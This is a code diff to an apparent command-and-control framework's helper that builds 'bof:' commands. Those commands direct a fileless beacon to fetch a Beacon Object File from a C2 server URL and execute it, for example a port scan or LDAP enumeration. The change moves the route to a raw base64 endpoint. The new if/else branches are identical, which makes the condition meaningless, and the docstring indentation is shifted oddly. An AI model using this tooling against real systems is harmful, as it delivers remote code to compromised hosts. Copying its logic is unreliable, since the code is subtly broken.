@@ -415,7 +415,7 @@ class BeaconConfigBuilder:
             return cls(_json.load(f))
 
 
-_BOFS_URL_SEGMENT = "bofs"
+_BOFS_URL_SEGMENT = "bof"
 _DOWNLOAD_SEGMENT = "download"
 _CLIENT_ID_MAX_LENGTH = 128
 _CLIENT_ID_ALLOWED = re.compile(r"^[A-Za-z0-9_-]{1,128}$")
@@ -460,15 +460,16 @@ def generate_bof_execution_command(
     after the first space is passed verbatim to the BOF ``go`` entry
     point as the argument buffer, so arguments are joined with commas.
 
-    Args:
-        bof_name: BOF catalog name (e.g., ``ldap_enum``).
-        c2_url: C2 base URL (e.g., ``https://10.10.14.1:4444``).
-        args: Optional arguments to pass to the BOF as one comma-joined string.
-        bofs_dir: URL segment under ``/download/`` that serves the BOF.
+        Args:
+            bof_name: BOF catalog name (e.g., ``ldap_enum``).
+            c2_url: C2 base URL (e.g., ``https://10.10.14.1:4444``).
+            args: Optional arguments to pass to the BOF as one comma-joined string.
+            bofs_dir: URL segment serving the BOF (default ``bof``, the
+                raw base64 route the fileless beacon consumes).
 
     Returns:
-        A command string like ``bof:https://10.10.14.1:4444/download/bofs/ldap_enum``
-        or ``bof:.../bofs/portscan 10.0.0.7,80,110`` when args are given.
+        A command string like ``bof:https://10.10.14.1:4444/bof/ldap_enum``
+        or ``bof:.../bof/portscan 10.0.0.7,80,110`` when args are given.
 
     Raises:
         ValueError: When ``bof_name``, ``bofs_dir`` or an arg contains
@@ -476,7 +477,10 @@ def generate_bof_execution_command(
     """
     _validate_bof_token(bof_name, "bof_name", url_token=True)
     _validate_bof_token(bofs_dir, "bofs_dir", url_token=True)
-    bof_path = f"{c2_url}/{_DOWNLOAD_SEGMENT}/{bofs_dir}/{bof_name}"
+    if bofs_dir.startswith(f"{_DOWNLOAD_SEGMENT}/"):
+        bof_path = f"{c2_url}/{bofs_dir}/{bof_name}"
+    else:
+        bof_path = f"{c2_url}/{bofs_dir}/{bof_name}"
     cmd = f"bof:{bof_path}"
     if args:
         arg_str = ",".join(a.strip() for a in args if str(a).strip())
